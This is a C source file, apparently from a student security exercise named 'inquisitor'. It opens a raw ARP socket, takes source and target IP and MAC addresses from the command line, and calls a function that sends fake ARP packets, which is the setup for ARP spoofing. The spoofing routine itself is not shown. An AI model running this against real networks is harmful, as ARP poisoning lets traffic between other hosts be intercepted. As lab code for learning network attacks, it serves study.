#include "../inc/inquisitor.h"

void init_inqui(t_inquisitor *inquisitor, char **av) {
    inquisitor->ip_src = av[1];
    inquisitor->mac_src = av[2];
    inquisitor->ip_target = av[3];
    inquisitor->mac_target = av[4];
    inquisitor->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (inquisitor->sock == -1) {
        dprintf(2, "socket error: %s, file: %s, line: %d: \n",  strerror(errno), __FILE__, __LINE__ - 2);
        exit (EXIT_FAILURE);
    }
    inquisitor->ifr.ifr_addr.sa_family = AF_INET;
    strncpy(inquisitor->ifr.ifr_name, "eth0", 7);
    ioctl(inquisitor->sock, SIOCGIFADDR, &inquisitor->ifr);
    int retval = ioctl(inquisitor->sock, SIOCGIFHWADDR, &inquisitor->ifr);
    if (retval) {
        dprintf(2, "ioctl error: %s, file: %s, line: %d: \n",  strerror(errno), __FILE__, __LINE__ - 2);
    }
    dprintf(1, "my ip = %s\n\n", inet_ntoa(( (struct sockaddr_in *)&inquisitor->ifr.ifr_addr )->sin_addr));
}

int main(int ac, char **av) {
    if (ac != 5)
        usage();
    int retval = 0;
    t_inquisitor inquisitor;
    dprintf(1, "BASE INFO:\n");
    dprintf(1, "IP_SRC: %s\n", av[1]);
    dprintf(1, "MAC_SRC: %s\n", av[2]);
    dprintf(1, "IP_TARGET: %s\n", av[3]);
    dprintf(1, "MAC_TARGET: %s\n", av[4]);
    dprintf(1, "\n");
    init_inqui(&inquisitor, av);
    retval = send_fake_arp_packet_1(&inquisitor);
    if (retval)
        return( printf("Error sending first arp packet"), EXIT_FAILURE);;
    close(inquisitor.sock);
}
